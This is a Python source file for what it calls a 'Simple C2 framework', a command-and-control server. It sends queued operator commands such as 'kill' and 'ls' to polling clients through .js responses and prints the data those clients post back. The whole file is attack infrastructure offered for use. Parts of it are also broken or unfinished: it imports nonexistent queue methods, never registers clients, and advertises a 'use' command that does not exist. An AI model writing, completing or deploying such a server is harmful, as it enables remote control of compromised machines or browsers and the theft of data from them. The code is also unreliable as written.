#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread, Event
from time import time, sleep
from urllib.parse import unquote

import sys
import random
import socket

from queue import Queue, Node




cmd_queue = Queue()
client_list = dict()
connected = False
timeout_max = 60


class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global cmd_queue
        # TODO: if cmd_queue is not empty, the next cmd in the content
        # Empty header
        self.send_response(200)
        self.end_headers()
        if self.path[-3:] == ".js" and not cmd_queue.is_empty():
            cmd_to_add = cmd_queue.pop()
            self.wfile.write(cmd_to_add.content.encode())
        else:
            self.wfile.write(b"")

    def do_POST(self):
        self.send_response(201)
        self.end_headers()
        self.wfile.write(b"")
        length = int(self.headers['content-length'])
        data = unquote(self.rfile.read(length).decode("UTF-8")).split()
        data_dict = dict()
        for d in data:
            var, value = d.split('=')
            value = value.replace('+', '')
            value = value.replace("'", '')
            data_dict[var] = value
        print(data_dict.get("data"))


def run_server(stop_event, ip="0.0.0.0", port=80, server_class=HTTPServer, handler_class=SimpleHandler):
    server_address = (ip, port)
    httpd = server_class(server_address, handler_class)
    # Set a timeout for handle_request to periodically check stop_event
    httpd.timeout = 1  # 1-second timeout
    while not stop_event.is_set():
        httpd.handle_request()  # Handle a single request at a time with a timeout
    httpd.server_close()
    print("HTTP server stopped.")


def check_neighbor(stop_event):
    to = 20
    last = 0
    while not stop_event.is_set():
        current = time()
        if current > last + to or last == 0:
            last = current
            to_del = False
            for key in client_list.keys():
                if client_list[key] + timeout_max < current:
                    to_del = key
                    break
            if to_del:
                del client_list[to_del]
        sleep(0.1)
    print("Check neighbor stopped")


def command_loop(stop_event):
    global cmd_queue
    while not stop_event.is_set():
        user_in = input("$: ").split()
        try:
            match user_in[0]:
                case "help": help()
                case "kill": cmd_queue.push(Node("kill"))
                case "ls": cmd_queue.push(Node("ls"))
                case "clients": 
                    show_clients()
                    print("Type `use <ip>` to connect to a client.")
                case "exit": stop_event.set()
                case _: print("Command not recognized.")
        except IndexError:
            pass


def show_clients():
    current = time()
    if client_list.keys():
        for key in client_list.keys():
            print(f'IP: {key}, last time heard: {current - client_list[key]: .2f}s ago.')
    else:
        print("No clients connected.")





if __name__ == "__main__":
    print("Welcome in Simple C2 framework")

    stop_event = Event()

    processes = [run_server, check_neighbor, command_loop]
    threads = list()
    for process in processes:
        t = Thread(target=process, args=(stop_event, ))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

